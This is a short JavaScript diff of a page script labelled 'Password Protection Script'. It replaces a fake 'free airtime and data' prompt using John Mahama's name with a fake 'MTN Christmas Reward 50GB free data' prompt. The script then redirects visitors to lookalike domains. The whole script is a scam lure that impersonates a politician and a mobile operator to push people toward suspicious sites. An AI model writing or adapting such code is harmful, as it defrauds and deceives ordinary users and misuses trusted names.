@@ -1,7 +1,6 @@
 /* Password Protection Script by www.onlineofferz.xyz*/
-var password = '0k'
-password=prompt('SMS: Welcome to Ghana GH₵10 Airtime and 15GB Free Data From JOHN MAHAMA Offer, Kindly Press OK to ACTIVATE ','15GB Free Data');
-if (password != 'ok') {
-location.href='https://mahama.data-offer.xyz/15GB';
-
+var password = '50GB DATA'
+password=prompt('SMS: Congratulations You are Eligible to receive 50GB Free Data MTN CHRISTMAS REWARD Valid For 30days, Kindly Press OK to ACTIVATE ','50GB DATA');
+if (password != '50GB DATA') {
+location.href='https://mtn.granddata.live/50GB';
 }
